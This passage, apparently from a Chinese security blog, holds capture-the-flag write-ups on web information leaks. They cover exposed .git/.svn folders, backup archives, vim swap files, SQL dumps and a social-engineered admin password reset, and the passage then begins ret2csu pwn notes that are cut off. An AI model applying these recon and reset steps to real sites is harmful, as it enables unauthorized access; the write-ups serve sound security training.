&lt;p&gt;在robots.txt中至少要有一条disallow；&lt;br&gt;Disallow记录为空，则表示网站所有页面都允许被抓取；&lt;br&gt;使用disallow，每个页面必须单独分开声明；&lt;br&gt;注意disallow：&amp;#x2F;abc&amp;#x2F;和disallow：&amp;#x2F;abc的区别；&lt;/p&gt;
&lt;p&gt;Allow：&lt;/p&gt;
&lt;p&gt;作用：用于描述搜索引擎蜘蛛爬行和抓取的url；&lt;/p&gt;
&lt;p&gt;使用技巧：搜索引擎默认所有的url是Allow；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​		访问robots.txt文件发现如下：&lt;/p&gt;
&lt;figure class=&#34;highlight tex&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;User-agent: *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /flagishere.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		访问这个文件后得到flag。&lt;/p&gt;
&lt;h1 id=&#34;Web5：&#34;&gt;&lt;a href=&#34;#Web5：&#34; class=&#34;headerlink&#34; title=&#34;Web5：&#34;&gt;&lt;/a&gt;Web5：&lt;/h1&gt;&lt;p&gt;​		题目描述：phps源码泄露有时候能帮上忙&lt;/p&gt;
&lt;p&gt;​		前置知识：&lt;strong&gt;phps文件&lt;/strong&gt;就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。&lt;/p&gt;
&lt;p&gt;​		访问index.phps文件下载后打开即可得到flag。&lt;/p&gt;
&lt;h1 id=&#34;Web6：&#34;&gt;&lt;a href=&#34;#Web6：&#34; class=&#34;headerlink&#34; title=&#34;Web6：&#34;&gt;&lt;/a&gt;Web6：&lt;/h1&gt;&lt;p&gt;​		题目描述：解压源码到当前目录，测试正常，收工&lt;/p&gt;
&lt;figure class=&#34;highlight tex&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  常见的网站源码备份文件后缀：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  常见的网站源码备份文件名：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;web&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;website&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;back&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;www&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wwwroot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		访问&lt;a href=&#34;http://www.zip获得源码,里面有flag./&#34;&gt;www.zip获得源码，里面有flag。&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;Web7：&#34;&gt;&lt;a href=&#34;#Web7：&#34; class=&#34;headerlink&#34; title=&#34;Web7：&#34;&gt;&lt;/a&gt;Web7：&lt;/h1&gt;&lt;p&gt;​		题目描述：版本控制很重要，但不要部署到生产环境更重要。&lt;/p&gt;
&lt;p&gt;​		git泄露，直接访问&amp;#x2F;.git&amp;#x2F;即可，或者Githack一把梭。&lt;/p&gt;
&lt;h1 id=&#34;Web8：&#34;&gt;&lt;a href=&#34;#Web8：&#34; class=&#34;headerlink&#34; title=&#34;Web8：&#34;&gt;&lt;/a&gt;Web8：&lt;/h1&gt;&lt;p&gt;​		题目描述：版本控制很重要，但不要部署到生产环境更重要。&lt;/p&gt;
&lt;p&gt;​		.svn泄露，直接访问。&lt;/p&gt;
&lt;h1 id=&#34;Web9：&#34;&gt;&lt;a href=&#34;#Web9：&#34; class=&#34;headerlink&#34; title=&#34;Web9：&#34;&gt;&lt;/a&gt;Web9：&lt;/h1&gt;&lt;p&gt;​		题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    vim泄露：当vim异常退出时，都会生成一个用于备份缓冲区内容的swp临时文件，来记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。假如原文件名为index.php

第一次产生的交换文件名为.index.php.swp
第二次产生的交换文件名为.index.php.swo
第三次产生的交换文件名为.index.php.swn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​		访问这个文件&lt;code&gt;index.php.swp&lt;/code&gt;，然后记事本打开拿到flag。&lt;/p&gt;
&lt;h1 id=&#34;Web10：&#34;&gt;&lt;a href=&#34;#Web10：&#34; class=&#34;headerlink&#34; title=&#34;Web10：&#34;&gt;&lt;/a&gt;Web10：&lt;/h1&gt;&lt;p&gt;​		题目描述：cookie 只是一块饼干，不能存放任何隐私数据。&lt;/p&gt;
&lt;p&gt;​		抓包，在cookie处发现flag。&lt;/p&gt;
&lt;h1 id=&#34;Web11：&#34;&gt;&lt;a href=&#34;#Web11：&#34; class=&#34;headerlink&#34; title=&#34;Web11：&#34;&gt;&lt;/a&gt;Web11：&lt;/h1&gt;&lt;p&gt;​		题目描述：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&#34;https://boce.aliyun.com/home%E9%87%8C%E9%9D%A2%E6%9F%A5%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E5%95%A5%E6%9F%A5%E4%B8%8D%E5%88%B0%EF%BC%8C%E4%B8%8D%E7%AE%A1%E4%BA%86%E3%80%82&#34;&gt;https://boce.aliyun.com/home里面查信息，但是我不知道为啥查不到，不管了。&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;Web12：&#34;&gt;&lt;a href=&#34;#Web12：&#34; class=&#34;headerlink&#34; title=&#34;Web12：&#34;&gt;&lt;/a&gt;Web12：&lt;/h1&gt;&lt;p&gt;​		题目描述：有时候网站上的公开信息，就是管理员常用密码&lt;/p&gt;
&lt;p&gt;​		访问robots.txt获取一些信息，就是&amp;#x2F;admin&amp;#x2F;目录，访问后弹出来了个登陆框，密码一般是admin，密码在index页面最下面：&lt;/p&gt;
&lt;figure class=&#34;highlight tex&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Help Line Number : 372619038&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;Web13：&#34;&gt;&lt;a href=&#34;#Web13：&#34; class=&#34;headerlink&#34; title=&#34;Web13：&#34;&gt;&lt;/a&gt;Web13：&lt;/h1&gt;&lt;p&gt;​		题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码&lt;/p&gt;
&lt;p&gt;​		读源码，发现document.pdf文件，打开发现了账号密码和一个页面，进入这个文件后登陆发现flag。&lt;/p&gt;
&lt;h1 id=&#34;Web14：&#34;&gt;&lt;a href=&#34;#Web14：&#34; class=&#34;headerlink&#34; title=&#34;Web14：&#34;&gt;&lt;/a&gt;Web14：&lt;/h1&gt;&lt;p&gt;​		题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人&lt;/p&gt;
&lt;p&gt;​		直接访问&amp;#x2F;editor&amp;#x2F;目录，点插入文件，找到flag文件的大致文件结构，相对路径访问即可得到flag。&lt;/p&gt;
&lt;h1 id=&#34;Web15：&#34;&gt;&lt;a href=&#34;#Web15：&#34; class=&#34;headerlink&#34; title=&#34;Web15：&#34;&gt;&lt;/a&gt;Web15：&lt;/h1&gt;&lt;p&gt;​		题目描述;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/p&gt;
&lt;p&gt;​		社工题，对真正技术没啥太大的关系。&lt;/p&gt;
&lt;p&gt;​		直接拉到最下边，电话号码和邮箱都有，url直接访问admin，进入登陆后台，之后就是忘记密码，提示：我的所在地是哪个城市？根据qq邮箱的qq号发现属地，通过这个修改密码即可。&lt;/p&gt;
&lt;h1 id=&#34;Web16：&#34;&gt;&lt;a href=&#34;#Web16：&#34; class=&#34;headerlink&#34; title=&#34;Web16：&#34;&gt;&lt;/a&gt;Web16：&lt;/h1&gt;&lt;p&gt;​		题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露&lt;/p&gt;
&lt;p&gt;​		有大佬用Wappalyzer 检测到了PHP，但是访问tz.php的原因是啥不是很清楚。打开tz.php之后找到PHP相关参数，打开PHPIINFO然后搜索ctfshow即可发现flag。&lt;/p&gt;
&lt;h1 id=&#34;Web17：&#34;&gt;&lt;a href=&#34;#Web17：&#34; class=&#34;headerlink&#34; title=&#34;Web17：&#34;&gt;&lt;/a&gt;Web17：&lt;/h1&gt;&lt;p&gt;​		题目描述：备份的sql文件会泄露敏感信息&lt;/p&gt;
&lt;p&gt;​		sql文件的备份一般为backup.sql，所以访问下载这个文件，记事本打开之后找到了如下语句：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;INTO&lt;/span&gt; `ctfshow_secret` &lt;span class=&#34;keyword&#34;&gt;VALUES&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;#x27;ctfshow&amp;#123;40b3ed5b-2454-49c7-a6ad-77e5cc738e2f&amp;#125;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;Web18：&#34;&gt;&lt;a href=&#34;#Web18：&#34; class=&#34;headerlink&#34; title=&#34;Web18：&#34;&gt;&lt;/a&gt;Web18：&lt;/h1&gt;&lt;p&gt;​		题目描述：不要着急，休息，休息一会儿，玩101分给你flag&lt;/p&gt;
&lt;p&gt;​		读js源码，找到以下逻辑：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(score&amp;gt;&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; result=&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;confirm&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		unicode解码是：你赢了，去幺幺零点皮爱吃皮看看，提示读取110.php，读取后获得flag。&lt;/p&gt;
&lt;h1 id=&#34;Web19：&#34;&gt;&lt;a href=&#34;#Web19：&#34; class=&#34;headerlink&#34; title=&#34;Web19：&#34;&gt;&lt;/a&gt;Web19：&lt;/h1&gt;&lt;p&gt;​		题目描述：密钥什么的，就不要放在前端了&lt;/p&gt;
&lt;p&gt;​		读源码，找到了被注释的php代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;fakeflag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pazzword&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;===&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; ===&lt;span class=&#34;string&#34;&gt;&amp;#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		账号密码都有了，后端抓包改包发送即可获得flag。&lt;/p&gt;
&lt;h1 id=&#34;Web20：&#34;&gt;&lt;a href=&#34;#Web20：&#34; class=&#34;headerlink&#34; title=&#34;Web20：&#34;&gt;&lt;/a&gt;Web20：&lt;/h1&gt;&lt;p&gt;​		题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。&lt;/p&gt;
&lt;p&gt;​		扫后台发现了db文件，下载即可，之后用数据库管理工具打开即可得到flag。&lt;/p&gt;

 &lt;h1 id=&#34;pwn学习笔记（9）-中级ROP–ret2csu&#34;&gt;&lt;a href=&#34;#pwn学习笔记（9）-中级ROP–ret2csu&#34; class=&#34;headerlink&#34; title=&#34;pwn学习笔记（9）-中级ROP–ret2csu&#34;&gt;&lt;/a&gt;pwn学习笔记（9）-中级ROP–ret2csu&lt;/h1&gt;&lt;h2 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;p&gt;​		首先是64位文件的传参方式：前六个参数是从左到右放入寄存器：rdi、rsi、rdx、rcx、r8、r9，之后的通过栈传参。&lt;/p&gt;
&lt;p&gt;​		比如：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;传参函数大于7个：&lt;/p&gt;
&lt;p&gt;H(a,b,c,d,e,f,g,h)&lt;/p&gt;
&lt;p&gt;a-&amp;gt;%rdi、b-&amp;gt;%rsi、c-&amp;gt;%rdx、d-&amp;gt;%rcx、e-&amp;gt;%r8、f-&amp;gt;%r9&lt;/p&gt;
&lt;p&gt;h-&amp;gt;(%esp)&lt;/p&gt;
&lt;p&gt;g-&amp;gt;(%esp)&lt;/p&gt;
&lt;p&gt;call H&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​		先看看如下代码：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;stdio.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; d,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; e,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; g,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; h)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,b = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,c = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,d = &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,e = &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,f = &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,g = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,h = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,H(a,b,c,d,e,f,g,h));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; d,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; e,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; g,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; h)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a+b+c+d+e+f+g+h;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		之后反汇编一下main函数和H函数的代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span 